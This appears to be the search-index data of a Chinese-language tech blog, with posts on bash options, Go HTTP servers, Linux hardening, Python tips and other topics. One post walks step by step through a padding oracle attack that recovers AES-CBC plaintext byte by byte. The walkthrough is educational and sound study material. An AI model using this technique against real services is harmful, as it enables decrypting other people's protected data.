Binding）","uri":"/posts/dynamic-lexical-binding-in-elisp/"},{"categories":null,"content":"Bash 在执行脚本的时候，会创建一个新的 shell, 每个 shell 都有自己独立的执行环境，这个环境会有一些默认行为，而这些默认行为可以通过 set 命令来修改。\n这里介绍几种常用的 set 命令。\n注： set 命令在不带参数执行时，会显示当前 shell 的所有环境变量、函数。\nset -u 遇到不存在的变量时报错，并停止执行 默认情况下， bash 遇到不存在的变量时会忽略。为了让脚本更加严谨和安全，报错并停止执行是一种更好的选择。\n1 2 3 set -u echo $non_exist_var Output:\n1 bash: line 4: non_exist_var: unbound variable set -x 运行命令之前，先打印命令本身 1 2 3 4 set -x unameOutput=\"$(uname -s)\" echo $unameOutput Output:\n1 2 3 4 ++ uname -s + unameOutput=Darwin + echo Darwin Darwin set -e 发生错误时及时终止脚本 默认情况下，脚本执行过程中如果出现运行失败的命令， Bash 会继续执行后面的命令，而这往往是不太安全的行为（因为后面的命令很可能依赖前面命令的成功执行）。\n1 2 cd /non/exist/path echo \"do something dangerous like rm files\" Output:\n1 2 bash: line 2: cd: /non/exist/path: No such file or directory do something dangerous like rm files 实践当中，为了避免该问题，我们可以利用逻辑运算符的短路行为来及时终止命令的执行：\n1 2 cd /non/exist/path || { echo \"/non/exist/path is not found\"; exit 1; } echo \"do something dangerous like rm files\" Output:\n1 2 bash: line 2: cd: /non/exist/path: No such file or directory /non/exist/path is not found 这种手工处理的方式比较麻烦，而且容易遗漏。 set -e 命令可以比较好的解决这个问题，该命令设置后，一旦某个命令失败，会立即停止后续命令的执行。\n1 2 3 4 set -e cd /non/exist/path echo \"do something dangerous like rm files\" Output:\n1 bash: line 4: cd: /non/exist/path: No such file or directory set -o pipefail 处理管道错误 set -e 不适用于管道命令，例如：\n1 2 3 4 set -e cat /non/exist/path | echo hello echo world Output:\n1 2 3 hello cat: /non/exist/path: No such file or directory world set -o pipefail 可以解决该问题：\n1 2 3 4 set -eo pipefail cat /non/exist/path | echo hello echo world Output:\n1 2 hello cat: /non/exist/path: No such file or directory 总结 上述四个 set 命令可以按照如下方式一起设置：\n1 2 3 4 5 6 # 写法一 set -euxo pipefail # 写法二 set -eux set -o pipefail 建议放在所有 Bash 脚本开头。\n另外也可以在执行 Bash 脚本时，从命令行传入这些参数：\n1 bash -euxo pipefail /path/to/script.sh 参考资料 The Set Builtin (Bash Reference Manual) Bash 脚本 set 命令教程 - 阮一峰的网络日志 ","description":"\n","tags":["linux","tools","bash"],"title":"\nBash: set 命令用法介绍","uri":"/posts/bash-set/"},{"categories":null,"content":"日常开发工作中，经常会需要分析日志文件，有一件趁手的工具会高效很多。\nEmacs 正是这样一个工具。\nVim 也有类似的功能（参考 Vim Tips），但就分析日志来说，似乎没有 Emacs 来得方便。\n统计 \u0026 搜索 M-x count-matches 可输入正则表达式，统计正则匹配到的次数\nC-M-s 正则搜索\n在输入正则表达式时，如果需要匹配换行符，请输入 C-j 。\n替换 C-M-% query-replace-regexp 正则替换\n过滤 M-s o pattern RET 列出所有匹配行\nkeep-lines 仅保留匹配的行\nflush-lines 剔除匹配的行\n提取 C-u M-s o pattern RET 将所有匹配的文本，导出到 *Occur buffer *中。这个功能挺方便的，可以快速将匹配项提取到另一个 buffer 中。\n","description":"\n","tags":["emacs","tools","regexp"],"title":"\n用 Emacs 分析日志文件","uri":"/posts/use-emacs-to-analyse-log-files/"},{"categories":null,"content":"今天读到一篇不错的文章，讲如何用 Go 写 HTTP 服务的，很有同感，翻译如下。\n原文链接\nA Server struct 一个 Server struct 是一个代表服务的对象，持有所有依赖。\n每个组件都有一个唯一的 server struct，最后看起来通常类似这个样子：\n1 2 3 4 5 type server struct { db *someDatabase router *someRouter email EmailSender } 该结构的字段主要是各种需要共享的依赖 routes.go 每个组件都有一个 routers.go 文件，包含所有的路由：\n1 2 3 4 5 6 7 package app func (s *server) routes() { s.router.HandleFunc(\"/api/\", s.handleAPI()) s.router.HandleFunc(\"/about\", s.handleAbout()) s.router.HandleFunc(\"/\", s.handleIndex()) } 由于大部分代码维护工作都是从一个 URL 和一个错误报告开始的，所以只需要看一眼 routes.go 文件，即可知道应该去那里查找问题。\nHandlers 挂着（hang off） server 对象 HTTP handlers 挂着 server 对象：\n1 func (s *server) handleSomething() http.HandlerFunc { ... } Handlers 可以通过 server 对象访问依赖。\n返回 handler Handler 函数不直接处理请求，而是返回一个函数处理之。\n这样我们就有一个闭包环境，在这里我们的 handler 可以这样操作：\n1 2 3 4 5 6 func (s *server) handleSomething() http.HandlerFunc { thing := prepareThing() return func(w http.ResponseWriter, r *http.Request) { // use the thing } } prepareThing() 方法只会被调用一次，因此你可以用来执行一次性的 handler 初始化动作，然后在 handler 中使用初始化的结果（ thing ）。\n在访问共享数据时，确保只执行读操作，否则需要加锁或者类似的保护措施。\n通过参数传递 handler 的特定依赖 如果一个 handler 需要一个特殊依赖，可以通过参数来传递。\n1 2 3 4 5 func (s *server) handleGreeting(format string) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { fmt.Fprintf(w, format, \"World\") } } 使用 HandlerFunc 而非 Handler 我几乎在所有情况下都使用 http.HandlerFunc ，而非 http.Handler 。\n1 2 3 4 5 func (s *server) handleSomething() http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { // ... } } 两者基本上是可互换的，只需要选一个可读性更强的就好。对我而言， http.HandlerFunc 会好点。\n中间件就是普通的 Go 函数 中间件函数接受一个 http.HandlerFunc 参数，并返回一个新的 http.HandlerFunc ，新的这个 handler 可以在调用传入的 handler 之前或之后，执行任意代码，也可以选择完全不执行传入的 handler。\n1 2 3 4 5 6 7 8 9 func (s *server) adminOnly(h http.HandlerFunc) http.HandlerFunc { return func(w http.ResponseWriter, r *http.Request) { if !currentUser(r).IsAdmin { http.NotFound(w, r) return } h(w, r) } } 上述例子中，如果 IsAdmin 为 false，则返回 404 并且终止处理。注意这种情况下，传入的 h handler 并未被调用。\n如果 IsAdmin 为 true，则正常走传入的 h handler 逻辑。\n中间件也可以列在 routes.go 中：\n1 2 3 4 5 6 7 package app func (s *server) routes() { s.router.HandleFunc(\"/api/\", s.handleAPI)) s.router.HandleFunc(\"/about\", s.handleAbout()) s.router.HandleFunc(\"/\", s.handleIndex()) s.router.HandleFunc(\"/admin\", s.adminOnly(s.handleAdminIndex())) } 就地定义请求和响应类型 如果一个端点（endpoint）有自己的请求、响应类型，通常这些类型只对改 handler 有用。\n如果确实如此，则可以直接在函数内部定义这些类型：\n1 2 3 4 5 6 7 8 9 10 11 func (s *server) handleSomething() http.HandlerFunc { type request struct { Name string } type response struct { Greeting string `json:\"greeting\"` } return func(w http.ResponseWriter, r *http.Request) { // ... } } 这样不会污染你的包命名空间，允许你在不同的 handler 中使用相同的名字，而非为每个 handler 想一个不同的名字。\n在测试代码中，也可以直接拷贝这些类型定义到测试函数中。\n类型定义可以帮助人们构造测试用例，以及理解代码 如果你的请求、响应类型隐藏在 handler 内部，你可以在测试代码中直接定义新类型。\n这是一个表达你的意图，方便后人理解你的代码的机会。\n例如，假设有一个 Person 类型，在很多端点（endpoint）中被复用。其中有一个 /greet 端点，我们大概率只关心 Person.name 这个字段，因此我们可以在测试代码中表达这一点：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 func TestGreet(t *testing.T) { is := is.New(t) p := struct { Name string `json:\"name\"` }{ Name: \"Mat Ryer\", } var buf bytes.Buffer err := json.NewEncoder(\u0026buf).Encode(p) is.NoErr(err) // json.NewEncoder req, err := http.NewRequest(http.MethodPost, \"/greet\", \u0026buf) is.NoErr(err) // ... more test code here } 仅从功能测试角度来讲，这么做是 OK 的，被测代码的用法也表达的很清楚。但是从鲁棒性测试的角度，也许需要考虑到传递整个数据结构进去，会不会产生什么问题？\n利用 sync.Once 设置依赖 在准备 handler 的时候，如果需要执行一些成本比较高的初始化操作，可以考虑将该操作延迟到该 handler 第一次被调用的时候。\n这可以改善应用的启动时间。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 func (s *server) handleTemplate(files string...) http.HandlerFunc { var ( init sync.Once tpl *template.Template tplerr error ) return func(w http.ResponseWriter, r *http.Request) { init.Do(func() { tpl, tplerr = template.ParseFiles(files...) }) if tplerr != nil { http.Error(w, tplerr.Error(), http.StatusInternalServerError) return } // use tpl } } sync.Once 确保该代码只会被执行一次，而且其他调用（其他人发起同一个请求时）会一直阻塞直到执行结束。\n错误检查放在 init 函数外面，因此如果有错误发生，我们可以暴露出该错误，同时保留错误日志 如果该 handler 未被调用，则该高成本操作永远不会被执行。有些情况下这样做有很大收益，取决于你的代码是如何部署的 这种方式实际上是将初始化时间从启动阶段转移到了运行时。如果使用 Google App Engine 则很有用，其他场景则需要单独考虑。\n服务可测性 上述的 server 类型是充分可测的。\n1 2 3 4 5 6 7 8 9 10 11 12 func TestHandleAbout(t *testing.T) { is := is.New(t) srv := server { db: mockDatabase, email: mockEmailSender, } srv.routes() req := httptest.NewRequest(\"GET\", \"/about\", nil) w := httptest.NewRecorder() srv.ServeHTTP(w, req) is.Equal(w.StatusCode, http.StatusOK) } 在每个测试中创建一个 server 实例 —— 如果耗时操作是懒加载的，那么这么做不会耗费太多时间，即使对于大组件来说也适用 通过调用 server 的 ServeHTTP 方法，包括路由、中间件等整个栈都可以被测到。当然，如果你不希望测试整个栈，也可以直接调用 handler 方法 使用 httptest.NewRequest 和 httptest.NewRecorder 来记录 handlers 都做了什么 代码中使用了 is 测试框架，Testify 的一个迷你替代版本：is ","description":"\n","tags":["golang","server"],"title":"\n经历八年后，我是如何用 Go 写 HTTP 服务的","uri":"/posts/how-i-write-http-services-in-go/"},{"categories":null,"content":"原理阐述 Padding 在密码学中，由于底层加密算法往往是针对固定长度的块来设计的（例如 AES 的 CBC 模式的块大小为 16），所以在对可变长度的明文进行加密时，一般需要额外增加 padding 字段来满足块对齐以便进行加密。\nPadding 方法可能有多种，为简单起见，这里只讨论常用的 PKCS7Padding 方法。在 PKCS7Padding 方法中，padding 字段填充的每个字节的值都是相同的，其值均为需要填充的字节个数，例如：如果块大小是 16， 那么明文 “aaaa” 的 padding 就是 [12]*12。如果明文长度刚好是块大小的整数倍，则需要额外加上一个块的 padding，即 [16]*16 。\nPKCS7Padding 的 Python 实现代码如下：\n1 2 3 4 def pkcs7padding(plaintext): bs = 16 padding_len = bs - len(plaintext) % bs return plaintext + padding_len * chr(padding_len) Padding Oracle 指被攻击对象暴露的一个接口，该接口可以通过任意形式提供，例如可能是命令行，可能是API，也可能是 REST 接口等等。形式不重要，重要的是内容，该接口可以输入密文，返回该段密文解密后的 Padding 是否正确。如果解密相关的应用开发者不小心，很有可能会暴露出该类接口（例如在提供 web 服务时，后端解密代码未对 Padding 异常情况进行捕捉，导致 HTTP 500 错误）。\nPadding Oracle Attack 就是利用 Padding Oracle 来进行攻击的，简单来说，攻击者首先需要窃取一段密文，其次要有一个 Padding Oracle 可供利用，然后攻击者便可通过不断篡改密文并发送到 Padding Oracle 进行验证的方式，来对这段密文进行破解。\nXOR（异或） 在解释下一个概念之前，先让我们稍微复习下 XOR（异或）操作。下面是 XOR 的一些基本公式：\n1 2 3 4 5 A ⊕ A = 0 A ⊕ 0 = A A ⊕ B = B ⊕ A (A ⊕ B) ⊕ C = A ⊕ (B ⊕ C) ∴ A ⊕ B ⊕ B = A ⊕ (B ⊕ B) = A ⊕ 0 = A Cipher-Block Chaining (CBC) 本文将阐述针对 AES CBC 模式的 Padding Oracle Attack，因此，有必要先解释下 CBC 模式的工作过程。\n顾名思义，CBC 是针对块的加密，而且块与块之间是存在链式关系的（这种链式关系你很快就会理解了）。\n加密过程 在 CBC 中，有一个名叫 “block cipher\"的东西，这个 “block cipher” 接受『块』作为输入，密文作为输出。本文不涉及 “block cipher” 的具体工作原理，我们可以把 “block cipher” 当作黑盒子来处理。\n在 CBC 加密过程中，每个 “plaintext block” 在送入 “block cipher” 前，都需要先和它前面的 “ciphertext block” (即前面相邻的已加密的密文块) 进行 XOR 操作，XOR 的结果再送入 “block cipher\"进行加密处理。这意味着每个加密出来的密文块都依赖于前面的明文加密后的结果，因此改变每一个明文字符都会对后面的加密结果产生巨大影响。这是一种被推荐的、比较安全的加密模式。\n(from Wikipedia )\n解密过程 类似的，在解密过程中，有一个 “block cipher decryption”，这个东东接受『密文块』作为输入，但输出不是明文，是一个中间结果。结合上面加密的过程，我们不难理解，这个中间结果就是明文在和 previous cipher block 异或之后的结果。拿到这个中间结果后，跟进前面异或公式的最后一条可知，只需将该中间结果和 previous cipher block 再做一次异或，即可得到最初的明文块。至此，该 block 解密结束。如果是第一个 cipher block，则将中间结果和 IV 进行一次异或即可得到明文块。\n(图片来自 Rob Heaton’s blog )\n当然，如果是最后一个 block，还需要根据 PKCS7Padding 的规则将尾部 Padding 剔除，剔除 Padding 的 Python 实现代码如下：\n1 2 3 4 5 def pkcs7unpadding(plaintext): padding_len = ord(plaintext[-1]) # check if the padding_len is valid # ... return plaintext[:-padding_len] 攻击过程 有了上述这些概念，攻击过程就比较好理解了。\n攻击者就是通过计算上面提到的『中间结果』来达到解密目的的。怎么计算『中间结果』呢？答案是试！利用 Padding Oracle 来试。\n首先，明确几个概念：\n我们窃取了一段密文 我们是一块一块来破解的（因为 CBC 是一块一块加密的） 我们有一个 Padding Oracle 为了描述方便起见，这里定义几个缩写（可结合下面的图片来理解）：\nC1: 待破解密文块相邻的前面的密文块 C2: 待破解密文块 I2: 待破解密文块经过 “block cipher decryption” 解密出来的中间结果，可与 C1 异或后得到明文块 P2: 待破解密文块解密后的明文块 因此我们有如下公式：\n1 P2 = C1 ^ I2 C1 是已知的，因此我们的工作就是算出 I2 。\n破解最后一个字节 首先，我们从破解最后一个 block 的最后一个字节开始。\n根据前面的定义，C2 是密文的最后一个 block，C1 是密文的倒数第二个 block 。看下破解过程：\n(图片来自 Rob Heaton’s blog )\n先把 C1 替换成 [0]*16 （即16个0），把新的 C1 叫做 C1' 把 C1’ + C2 传入 Padding Oracle，成功则跳到第 4 步，否则继续 C1’[15] 自增（上限是 255），并重复第 2 步 由于 C1’ + C2 通过了 Padding 检查，可以确定 P2’[15] 一定是 1~16 中的一个值，这里我们先假定是1（可通过继续修改 C1’ 来进一步确定 P2’[15] 的值，为了避免引入额外的复杂度，这里先不介绍如何确定 P2’[15] 的值，后面再详细介绍）。假设此时 C1’[15] 自增到了 94，则按照如下公式可计算出 I2[15] 1 2 3 4 I2 = C1' ^ P2' I2[15] = C1'[15] ^ P2'[15] I2[15] = 94 ^ 1 = 95 进一步，因为 C1 是已知的，所以:\n1 2 P2[15] = C1[15] ^ I2[15] = C1[15] ^ 95 至此，P2[15] 已经计算出来了，即最后一个字节已经被破解了！\n破解最后一个 block 的剩余字节 为了破解剩余字节，我们先可以把 P2’[15] 定位 2，根据 PKCS7Padding 的定义，如果 padding 是合法的，则 P2’[14] 也一定是 2。我们就根据这个思路来破解倒数第二个字节。\n先把 C1’[0..14] 置 0，C1’[15] 设置成 2 ^ I2[15] （确保 P2’[15] 是 2） C1’ + C2 传入 Padding Oracle，测试成功则跳到第 4 步，否则继续下一步 C1’[14] 自增，重复第 2 步 根据以下公式计算 I2[15]: 1 2 3 I2 = C1' ^ P2' I2[14] = C1'[14] ^ P2'[14] = C1'[14] ^ 2 由于 C1 是已知的，所以：\n1 P2[14] = C1[14] ^ I2[14] 至此，P2[14] 计算出来了，即倒数第二个字节被破解了！\n重复上述步骤，即可破解最后一个 block 的剩余字节。\n重复上面两节的步骤，即可破解所有 block。第一个 block 稍有不同，因为第一个 block 没有对应的 C1，此时， C1 = IV 。\n确定最后一个字节的值 我们回过头来看这个问题。\n我们来分析一下，如果此时 P2’[15] 是2而不是1，意味着什么呢？根据 PKCS7Padding 的定义，这意味着：\n1 P2'[14] == P2'[15] == 2 注意此时 C1’[14] 的值是 0，我们可以通过修改 C1’[14] 的值（例如修改成1），然后将 C1’ + C2 传入 Padding Oracle 进行测试，如果通过则表示 P2’[15] 只可能是1。什么原因呢？因为 C1’[14] 的值被修改后，必然会影响 P2’[14]，而变化后的 P2’ 仍能通过测试，说明 Padding 只能是 1，否则 P2’[14] != P2’[15] 是必然通不过测试的。如果修改后没有通过测试呢？此时说明 P2’[14] \u003e= 2，那我们只需要重复以上步骤（把 C1’[14] 重置为0，修改 C1’[13] 的值为1）再做一遍 Padding 测试即可。如此最多测试 15 次，即可确定 P2’[15] 的值。步骤可归纳如下：\ni = 14, C1’[i] = 1 PaddingOracle(C1’ + C2) 是否成功？成功跳到第 4 步，否则继续 C1’[i] = 0, i -= 1, 如果 i \u003c 0，则跳转第 5 步；否则 C1’[i] = 1，重复第 2 步 根据 PKCS7Padding 的定义，可确定 P2’[15] 的值为 16 - i - 1，结束 根据 PKCS7Padding 的定义，可确定 P2’[15] 的值为 16，结束 程序实现 作为练习和测试，这里用 Python 语言实现了一个 Padding Oracle Attack 的 Demo，见 padding-oracle-attack 。\n参考 The Padding Oracle Attack - why crypto is terrifying Padding oracle attacks: in depth 第一篇文章写的比较生动易理解，图文配合的很好（本文图片就是引自这里），缺点是没有提到 P2’[15] 值的确定，甚至直接断定 P2’[15] == 1，不太严谨。经我个人测试是有可能出现其他值的。\n第二篇文章写的比较严谨、比较形式化，但也比较枯燥，没那么形象生动。不过这篇文章提到了 P2’[15] 的不确定性，而且简单介绍了解决办法（在Backtracking一节中有简单说明），但未做详细阐述。\n附录 AES with PBKDF2 \u0026 PKCS7Padding \u0026 CBC mode in Swift (iOS):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 enum CryptorError: ErrorType { case PasswordError case RandomSaltError case AllocError case DeriveDataError case EncryptError case UnknownError } internal func AESEncrypt(plaintext: NSData, password: String) throws -\u003e (NSData, NSData) { guard let passwordData: NSData = password.dataUsingEncoding(NSUTF8StringEncoding, allowLossyConversion: false) else { throw(CryptorError.PasswordError) } let operation = CCOperation(kCCEncrypt) let options = UInt32(kCCOptionPKCS7Padding) let palintextLen = Int(plaintext.length) let plaintextBytes = UnsafePointer\u003cVoid\u003e(plaintext.bytes) let outBuffer = NSMutableData(length: Int(palintextLen) + algorithm.requiredBlockSize())! let outBufferPtr = UnsafeMutablePointer\u003cVoid\u003e(outBuffer.mutableBytes) let outBufferLen = size_t(outBuffer.length) var bytesDecrypted = Int(0) let SALT_LEN = 16 guard let randomSalt = SymmetricCryptor.randomDataOfLength(SALT_LEN) else { throw(CryptorError.RandomSaltError) } let saltBytes = UnsafePointer\u003cUInt8\u003e(randomSalt.bytes) let saltLen = randomSalt.length guard let derivedData = NSMutableData(length: 32) else { throw(CryptorError.AllocError) } let derivationResult = CCKeyDerivationPBKDF(CCPBKDFAlgorithm(kCCPBKDF2), UnsafePointer\u003cInt8\u003e(passwordData.bytes), passwordData.length, saltBytes, saltLen, CCPseudoRandomAlgorithm(kCCPRFHmacAlgSHA1), 1000, UnsafeMutablePointer\u003cUInt8\u003e(derivedData.mutableBytes), derivedData.length) guard Int32(derivationResult) == Int32(kCCSuccess) else { throw(CryptorError.DeriveDataError) } let derivedKey = derivedData.subdataWithRange(NSMakeRange(0, 16)) let derivedIV = derivedData.subdataWithRange(NSMakeRange(16, 16)) // Perform operation let cryptStatus = CCCrypt( operation, // Operation algorithm.ccAlgorithm(), // Algorithm options, // Options UnsafePointer\u003cVoid\u003e(derivedKey.bytes), // key data derivedKey.length, // key length UnsafePointer\u003cVoid\u003e(derivedIV.bytes), // IV buffer plaintextBytes, // input data palintextLen, // input length outBufferPtr, // output buffer outBufferLen, // output buffer length \u0026bytesDecrypted) // length of bytes decrypted guard Int32(cryptStatus) == Int32(kCCSuccess) else { throw(CryptorError.EncryptError) } outBuffer.length = bytesDecrypted // Adjust buffer size to real bytes return (randomSalt, outBuffer as NSData) } AES with PBKDF2 \u0026 PKCS7Padding \u0026 CBC mode in Python:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 from Crypto.Cipher import AES from Crypto import Random from pbkdf2 import PBKDF2 PBKDF2_ROUNDS = 1000 def AESEncrypt(plaintext, password): # padding bs = AES.block_size padding_len = bs - len(plaintext) % bs plaintext += chr(padding_len) * padding_len # prepare parameters salt = Random.new().read(16) derived = PBKDF2(password, salt, PBKDF2_ROUNDS).read(32) key, iv = derived[:16], derived[16:] # encrypt cipher = AES.new(key, AES.MODE_CBC, iv) cyphertext = cipher.encrypt(plaintext) return salt, cyphertext def AESDecrypt(cyphertext, password, salt): # derive key \u0026 iv derived = PBKDF2(password, salt, PBKDF2_ROUNDS).read(32) key, iv = derived[:16], derived[16:] # decrypt cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(cyphertext) # unpadding padding_len = ord(plaintext[-1]) return plaintext[:-padding_len] ","description":"\n","tags":["security","algorithm"],"title":"\nPadding Oracle Attack","uri":"/posts/padding-oracle-attack/"},{"categories":null,"content":"Creating a 1000MB ramdisk:\n1 2 3 4 5 6 7 8 9 10 11 12 $ hdiutil attach -nomount ram://$((2048 * 1000)) /dev/disk3 $ diskutil eraseVolume HFS+ RAMDisk /dev/disk3 Started erase on disk3 Unmounting disk Erasing Initialized /dev/rdisk3 as a 1000 MB case-insensitive HFS Plus volume Mounting disk Finished erase on disk3 RAMDisk $ hdiutil detach /dev/disk3 ","description":"\n","tags":["macos","tools"],"title":"\nCreate Ramdisk on macOS","uri":"/posts/create-ramdisk-on-macos/"},{"categories":null,"content":"ssh Modify /etc/ssh/sshd_config:\n1 2 3 4 5 6 7 8 9 10 11 12 13 # Disable root login PermitRootLogin no # Change the default port Port 12345 # Enable login with key RSAAuthentication yes PubkeyAuthentication yes # Disable login with password UsePAM no PasswordAuthentication no After that, remember to restart sshd: sudo /etc/init.d/ssh restart (for Debian/Ubuntu) or sudo service sshd restart (for CentOS).\niptables Refer to https://wiki.debian.org/iptables* Create the file /etc/iptables.test.rules, and enter rules:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 *filter # Allows all loopback (lo0) traffic and drop all traffic to 127/8 that doesn't use lo0 -A INPUT -i lo -j ACCEPT -A INPUT ! -i lo -d 127.0.0.0/8 -j REJECT # Accepts all established inbound connections -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT # Allows all outbound traffic # You could modify this to only allow certain traffic -A OUTPUT -j ACCEPT # Allows HTTP and HTTPS connections from anywhere (the normal ports for websites) -A INPUT -p tcp --dport 80 -j ACCEPT -A INPUT -p tcp --dport 443 -j ACCEPT # Allows SSH connections # The --dport number is the same as in /etc/ssh/sshd_config -A INPUT -p tcp -m state --state NEW --dport 22 -j ACCEPT # Now you should read up on iptables rules and consider whether ssh access # for everyone is really desired. Most likely you will only allow access from certain IPs. # Allow ping # note that blocking other types of icmp packets is considered a bad idea by some # remove -m icmp --icmp-type 8 from this line to allow all kinds of icmp: # \u003chttps://security.stackexchange.com/questions/22711\u003e -A INPUT -p icmp -m icmp --icmp-type 8 -j ACCEPT # log iptables denied calls (access via 'dmesg' command) -A INPUT -m limit --limit 5/min -j LOG --log-prefix \"iptables denied: \" --log-level 7 # Reject all other inbound - default deny unless explicitly allowed policy: -A INPUT -j REJECT -A FORWARD -j REJECT COMMIT Apply these rules:\n1 sudo iptables-restore \u003c /etc/iptables.test.rules And see the difference:\n1 iptables -L Save the rules:\n1 iptables-save \u003e /etc/iptables.up.rules Create file /etc/network/if-pre-up.d/iptables, and add these lines to it:\n1 2 #!/bin/sh /sbin/iptables-restore \u003c /etc/iptables.up.rules Add executable permision for the file:\nchmod +x /etc/network/if-pre-up.d/iptables\nTo check who is listening on TCP port 12345:\nlsof -n -i4TCP:12345 | grep LISTEN\nnginx Modify the file nginx.conf:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 http { # Hide nginx version information server_tokens off; # Catch all requests with wrong host and return 444 status server { listen 80 default_server; listen [::]:80 default_server; listen 443 ssl default_server; listen [::]:443 ssl default_server; return 444; } } ","description":"\n","tags":["linux","security"],"title":"\nLinux Security Tips","uri":"/posts/linux-security-tips/"},{"categories":null,"content":"如何破解一个 ELF 文件：hackme: Deconstructing an ELF File\n几点启示：\n编译时要使用 strip 选项 避免在代码中使用字符串常量存放敏感信息，strings 工具可以轻易 dump 出来 在调用库函数、系统函数时，避免在参数中传递明文的敏感信息， ltrace, strace 等工具可以轻易调试出来 另外，在Java代码中，也要避免使用明文字符串保存敏感信息，尤其是不要用 String 来保存密码，原因主要有以下几点：\nString 在 java 中是不可变的，而且会一直保留在内存中，直到垃圾收集器将其回收。而由于字符串被放在字符串缓冲池中以方便重复使用，所以它就可能在内存中被保留很长时间； 如果使用 char [] 来保存密码，在用完之后可以立即将其中所有的元素清空。所以将密码保存到字符数组中很明显的降低了密码被窃取的风险； 参考 为什么使用字符数组保存密码比使用String保存密码更好？。\n","description":"\n","tags":["security"],"title":"\nSecurity Tips：ELF 破解及几点启示","uri":"/posts/security-tips-elf-hack/"},{"categories":null,"content":" Bloom Filter 是由 Bloom 在 1970 年提出的一种多哈希函数映射的快速查找算法。\n通常应用在一些需要快速判断某个元素是否属于集合，但是并不严格要求 100% 正确的场合。\nHashMap 的问题 HashMap 具有 O(1) 的查找复杂度，但缺点也很明显：内存利用率不高。\n如果需要查询的是海量数据，使用 HashMap 就变得不太现实。\nBloom Filter Bloom filter 是一种概率型数据结构，具备如下几个特点：\n高效的插入、查询 极高的空间利用率 可以告诉你：某条记录一定不存在，或者有可能存在 实现原理 如上图，bloom filter 底层结构是一个 bit 数组（也可以是多个）。\n插入：采用多个独立的 hash 函数，分别计算该记录的 hash code，并将 hash code 所指向的 bit 位设置为 1；\n查询：采用多个独立的 hash 函数，分别计算该记录的 hash code\n如果其中某个 hash code 指向的 bit 位 ≠ 1，则该记录一定不存在； 如果每个 hash code 指向的 bit 位都为 1，则该记录可能存在。 使用场景 例如：\n浏览器用来快速确定某个 URL 是否存在本地缓存； 爬虫程序用来快速确定某个 URL 是否被爬取过； 搜索引擎用来快速确定某个 URL 是否被索引过。 ","description":"\n","tags":["algorithm"],"title":"\nBloom Filter 布隆过滤器","uri":"/posts/bloom-filter/"},{"categories":null,"content":"函数工具 functools 缓存类装饰器 @cache\n用于自动缓存函数的返回结果（即其他语言常见的 memoize）。\n使用起来非常简单，给函数增加 @cache 装饰器（Decorator）即可：\n1 2 3 4 5 6 7 8 9 10 11 12 from functools import cache @cache def factorial(n): return n * factorial(n-1) if n else 1 \u003e\u003e\u003e factorial(10) # 无缓存结果, 触发 11 次递归调用 3628800 \u003e\u003e\u003e factorial(5) # 直接返回缓存结果 120 \u003e\u003e\u003e factorial(12) # 触发 2 次递归调用, 其余 10 次直接使用缓存的结果 479001600 由于缓存是通过字典来实现的，key 就是函数的参数，所以，参数必须是 hashable 的。\n那如果想缓存属性（property）呢？很简单，直接在 @property 基础上，叠加一个 @cache 即可：\n1 2 3 4 5 6 7 8 9 10 11 from functools import cache import statistics class DataSet: def __init__(self, sequence_of_numbers): self._data = sequence_of_numbers @property @cache def stdev(self): return statistics.stdev(self._data) @cached_property\n上述这个是只读属性，如果想改成可写属性呢？functools 还提供了一个可写的版本 @cached_property：\n1 2 3 4 5 6 7 8 9 10 11 from functools import cached_property import statistics class DataSet: def __init__(self, sequence_of_numbers): self._data = sequence_of_numbers # 该属性是可写版本 @cached_property def stdev(self): return statistics.stdev(self._data) @lru_cache\n如果想限制缓存的 size 呢？可以使用 @lru_cache ：\n1 2 3 4 5 6 7 8 9 10 # maxsize 为可选参数，默认为 128 @lru_cache(maxsize=32) def get_pep(num): 'Retrieve text of a Python Enhancement Proposal' resource = 'https://peps.python.org/pep-%04d/' % num try: with urllib.request.urlopen(resource) as s: return s.read() except urllib.error.HTTPError: return 'Not Found' 和 @cache 类似，参数也必须是 hashable 的。\nPartial object functools.partial 函数可以创建一个 partial object ， partial object 是一个可调用的对象。\n字面上稍微有点抽象，看个例子就很清晰了：\n1 2 3 4 5 6 7 8 9 10 11 12 import functools def add(a, b): return a + b plus3 = functools.partial(add, 3) plus3(1) # out: 4 plus3(7) # out: 10 闭包示例：对函数进行求导 1 2 3 4 5 6 7 8 9 10 11 12 13 14 def derivative(f): # Computes the numerical derivative of a function. def df(x, dx=1e-6): return (f(x+dx) - f(x)) / dx return df def g(x): return x ** 2 # first derivative of g dg = derivative(g) # second derivative of g d2g = derivative(dg) Iterate over a list 2 items at a time 1 2 for (c1, c2) in zip(s[0::2], s[1::2]): print c1, c2 No-copy version:\n1 2 3 4 from itertools import izip, islice for (c1, c2) in izip(islice(s, 0, None, 2), islice(s, 1, None, 2)): print c1, c2 Hex ↔ Bin Hex string to bin string:\n1 2 s = 'bd2866849ae03b59861d40dd8bb0d4' ''.join([chr(int(''.join(two), 16)) for two in zip(s[0::2], s[1::2])]) Bin string to hex string:\n1 2 binstr = '\\\\xbd(f\\\\x84\\\\x9a\\\\xe0;Y\\\\x86\\\\x1d@\\\\xdd\\\\x8b\\\\xb0\\\\xd4' ''.join(('{0:02x}'.format(ord(c)) for c in binstr)) ","description":"\n","tags":["python"],"title":"\nPython Tips","uri":"/posts/python-tips/"},{"categories":null,"content":" 查看文件属性\n1 2 $ lsattr filename ----i-------- filename 字母 i 意味着该文件是一个 Immutable （只读）文件。\n设置只读属性：\n1 $ chattr +i filename 去掉只读属性：\n1 $ chattr -i filename ","description":"\n","tags":["linux","tools"],"title":"\nLinux Tips: 只读文件 Immutable 